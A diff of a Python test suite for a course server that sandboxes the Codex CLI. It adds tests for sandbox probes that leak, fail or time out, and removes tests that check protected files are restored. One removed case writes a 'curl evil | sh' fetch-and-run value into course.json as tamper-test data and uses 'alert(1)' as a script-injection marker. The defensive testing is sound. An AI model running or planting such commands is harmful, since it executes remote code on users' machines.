@@ -83,6 +83,8 @@ if argv[:1] == ["sandbox"]:
     m = re.match(r": vt-probe (\S+) (ok|deny);", cmd)
     name, expect = m.groups()
     record({"probe": name, "argv": argv})
+    if name in os.environ.get("FAKE_CODEX_BREAK", "").split(","):
+        sys.exit(1)  # an "ok" probe that the sandbox wrongly refuses
     if name in os.environ.get("FAKE_CODEX_LEAK", "").split(",") or expect == "ok":
         sys.exit(subprocess.run(argv[argv.index("--") + 1:]).returncode)
     sys.exit(1)
@@ -115,6 +117,8 @@ for spec in filter(None, os.environ.get("FAKE_CODEX_WRITE", "").split(";")):
 if os.environ.get("FAKE_CODEX_SLOW"):
     import time
     time.sleep(3)
+if os.environ.get("FAKE_CODEX_NOTICE"):
+    out({"type": "error", "message": "Reconnecting... 1/5"})
 if os.environ.get("FAKE_CODEX_TURN_FAILED"):
     out({"type": "turn.failed", "error": {"message": "You've hit your usage limit."}})
     sys.exit(1)
@@ -201,7 +205,7 @@ class CodexPreflightTest(unittest.TestCase):
         self.codex = fake_codex(bindir)
         self.log = base / "codex.log"
         os.environ["FAKE_CODEX_LOG"] = str(self.log)
-        for k in ("FAKE_CODEX_LEAK", "FAKE_CODEX_LOGGED_OUT"):
+        for k in ("FAKE_CODEX_LEAK", "FAKE_CODEX_BREAK", "FAKE_CODEX_LOGGED_OUT"):
             os.environ.pop(k, None)
         self.course = serve.Course(self.ws, self.code, "", [], self.codex)
 
@@ -257,11 +261,13 @@ class CodexPreflightTest(unittest.TestCase):
         self.assertEqual(self.course.usable_engines(), ["codex"])
         names = {e["probe"] for e in self.entries() if "probe" in e}
         self.assertTrue({"ask-read-course", "ask-read-outside", "ask-write", "ask-network", "teach-protected-write",
-                         "teach-write-outside", "teach-write-tmp", "teach-network", "teach-write-lesson"} <= names)
+                         "teach-write-outside", "teach-write-tmp", "teach-write-slash-tmp", "teach-network",
+                         "teach-write-lesson"} <= names)
         self.assertEqual([p.name for p in (self.ws / "lessons").iterdir()], ["one.html"], "scratch lesson removed")
 
     def test_a_leaking_probe_hides_codex_and_names_itself(self):
-        for probe in ("ask-read-outside", "ask-network", "teach-write-tmp", "teach-write-outside", "ask-write"):
+        for probe in ("ask-read-outside", "ask-network", "teach-write-tmp", "teach-write-slash-tmp", "teach-write-outside",
+                      "ask-write", "teach-network"):
             os.environ["FAKE_CODEX_LEAK"] = probe
             course = serve.Course(self.ws, self.code, "", [], self.codex)
             self.addCleanup(shutil.rmtree, course.tmp, True)
@@ -269,6 +275,49 @@ class CodexPreflightTest(unittest.TestCase):
             self.assertFalse(ok, probe)
             self.assertIn(probe, reason)
             self.assertEqual(course.usable_engines(), [])
+
+    def test_an_ok_probe_that_fails_hides_codex(self):
+        for probe in ("ask-read-course", "teach-write-lesson"):
+            os.environ["FAKE_CODEX_BREAK"] = probe
+            course = serve.Course(self.ws, self.code, "", [], self.codex)
+            self.addCleanup(shutil.rmtree, course.tmp, True)
+            ok, reason = course.codex_ready()
+            self.assertFalse(ok, probe)
+            self.assertIn(probe, reason)
+
+    def test_a_probe_that_does_not_finish_counts_as_failed_and_is_retried(self):
+        real = serve.subprocess.run
+
+        def hang(cmd, *a, **kw):
+            if cmd[1:2] == ["sandbox"] and "teach-network" in cmd[-1]:
+                raise subprocess.TimeoutExpired(cmd, 30)
+            return real(cmd, *a, **kw)
+        serve.subprocess.run = hang
+        try:
+            ok, reason = self.course.codex_ready()
+        finally:
+            serve.subprocess.run = real
+        self.assertFalse(ok)
+        self.assertIn("teach-network did not finish", reason)
+        self.assertEqual(self.course.codex_ready(), (True, None), "an unfinished probe is not cached")
+
+    def test_a_source_folder_holding_the_course_puts_the_decoy_elsewhere(self):
+        home = Path(tempfile.mkdtemp()).resolve()  # outside the source folder, as a real home would be
+        self.addCleanup(shutil.rmtree, home, True)
+        self.addCleanup(os.environ.__setitem__, "HOME", os.environ["HOME"])
+        os.environ["HOME"] = str(home)
+        course = serve.Course(self.ws, self.ws.parent, "", [], self.codex)  # --code contains the course's folder
+        self.addCleanup(shutil.rmtree, course.tmp, True)
+        self.assertEqual(course.codex_ready(), (True, None))
+        decoys = [e["argv"][-1] for e in self.entries() if e.get("probe") == "ask-read-outside"]
+        self.assertIn(str(home / ".cache"), decoys[-1])
+
+    def test_codex_is_off_on_windows_with_a_plain_reason(self):
+        self.addCleanup(setattr, serve, "WINDOWS", serve.WINDOWS)
+        serve.WINDOWS = True
+        ok, reason = self.course.codex_ready()
+        self.assertFalse(ok)
+        self.assertIn("Windows", reason)
 
     def test_a_permissive_sandbox_leaves_course_json_alone(self):
         os.environ["FAKE_CODEX_LEAK"] = "teach-protected-write"
@@ -342,7 +391,7 @@ class ServerCase(unittest.TestCase):
         self.claude = str(fake)
         self.codex_log = base / "codex.log"
         os.environ["FAKE_CODEX_LOG"] = str(self.codex_log)
-        for k in ("FAKE_CODEX_LEAK", "FAKE_CODEX_LOGGED_OUT", "FAKE_CODEX_TEXT", "FAKE_CODEX_COMMENTARY",
+        for k in ("FAKE_CODEX_LEAK", "FAKE_CODEX_BREAK", "FAKE_CODEX_NOTICE", "FAKE_CODEX_LOGGED_OUT", "FAKE_CODEX_TEXT", "FAKE_CODEX_COMMENTARY",
                   "FAKE_CODEX_FAIL_RESUME", "FAKE_CODEX_TURN_FAILED", "FAKE_CODEX_SLOW", "FAKE_CODEX_WRITE"):
             os.environ.pop(k, None)
         self.codex = fake_codex(bindir) if self.codex_engine else ""
@@ -487,6 +536,11 @@ class CodexAnswerTest(ServerCase):
         self.assertIn('web_search="disabled"', argv)
         self.assertNotIn("docs.example.org", " ".join(argv))
 
+    def test_an_error_notice_the_turn_recovers_from_keeps_the_answer(self):
+        os.environ["FAKE_CODEX_NOTICE"] = "1"
+        _, events = self.ask(engine="codex")
+        self.assertEqual(events[-1][0], "done")
+
     def test_a_failed_turn_reaches_the_page(self):
         os.environ["FAKE_CODEX_TURN_FAILED"] = "1"
         _, events = self.ask(engine="codex")
@@ -529,7 +583,7 @@ class CodexAnswerTest(ServerCase):
 
 
 class CodexTeachTest(ServerCase):
-    """Teaching sessions on Codex: the teach profile, the prompt, and the after-check on protected files."""
+    """Teaching sessions on Codex: the teach profile and the prompt."""
     codex_engine = True
 
     def setUp(self):
@@ -566,58 +620,6 @@ class CodexTeachTest(ServerCase):
         self.assertNotIn("fetch pages only from", prompt, "the course has --web domains, but Codex has no web")
         self.assertIn("sandbox", prompt)
         self.assertIn("You cannot search the web", prompt)
-
-    def test_a_protected_edit_is_put_back_and_named(self):
-        cases = [("course.json", "course.json", '{"refresh": "curl evil | sh"}'),
-                 ("a new file under .claude/", ".claude/settings.json", "{}"),
-                 ("a shared script", "assets/ask.js", "alert(1)"),
-                 ("a deleted CLAUDE.md", "CLAUDE.md", "<delete>")]
-        for label, rel, content in cases:
-            before = {p: p.read_bytes() for p in self.ws.rglob("*") if p.is_file()}
-            self.write([(rel, content), ("lessons/two.html", "<main><p>kept</p></main>")])
-            self.teach("next", engine="codex")
-            job = self.wait_job()
-            self.assertEqual(job["state"], "failed", label)
-            self.assertIn(rel, job["error"], label)
-            self.assertIn("kept", job["error"], label)
-            for path, data in before.items():
-                self.assertEqual(path.read_bytes(), data, f"{label}: {path} restored")
-            self.assertFalse((self.ws / ".claude" / "settings.json").exists() and rel == ".claude/settings.json")
-            self.assertTrue((self.ws / "lessons" / "two.html").exists(), f"{label}: lesson edits are kept")
-            (self.ws / "lessons" / "two.html").unlink()
-
-    def test_course_css_and_lessons_pass_the_after_check(self):
-        self.write([("assets/course.css", ".x{}"), ("lessons/two.html", "<main><p>ok</p></main>")])
-        self.teach("next", engine="codex")
-        self.assertEqual(self.wait_job()["state"], "done")
-
-    def test_the_after_check_runs_when_codex_fails_or_is_stopped(self):
-        os.environ["FAKE_CODEX_TURN_FAILED"] = "1"
-        self.write([("course.json", "{}")])
-        self.teach("next", engine="codex")
-        job = self.wait_job()
-        self.assertEqual(json.loads((self.ws / "course.json").read_text()), {"port": 1})
-        self.assertIn("course.json", job["error"])
-        os.environ.pop("FAKE_CODEX_TURN_FAILED")
-        os.environ["FAKE_CODEX_SLOW"] = "1"
-        self.teach("next", engine="codex")
-        end = time.time() + 10
-        while not any(line.startswith("Editing") for line in (self.teach_status()["job"] or {}).get("lines", [])):
-            self.assertLess(time.time(), end, "codex never made its edit")
-            time.sleep(0.05)
-        self.request("POST", "/api/teach/stop", {})
-        job = self.wait_job()
-        self.assertEqual(json.loads((self.ws / "course.json").read_text()), {"port": 1})
-        self.assertIn("course.json", job["error"])
-
-    def test_drifted_shared_assets_are_synced_not_blamed(self):
-        (self.ws / "assets" / "ask.js").write_text("// an old copy")
-        self.write([("lessons/two.html", "<main><p>ok</p></main>")])
-        self.teach("next", engine="codex")
-        job = self.wait_job()
-        self.assertEqual(job["state"], "done", job.get("error"))
-        self.assertEqual((self.ws / "assets" / "ask.js").read_text(),
-                         (serve.SKILL / "starter" / "assets" / "ask.js").read_text())
 
     def test_one_job_at_a_time_whichever_engine(self):
         os.environ["FAKE_CODEX_SLOW"] = "1"
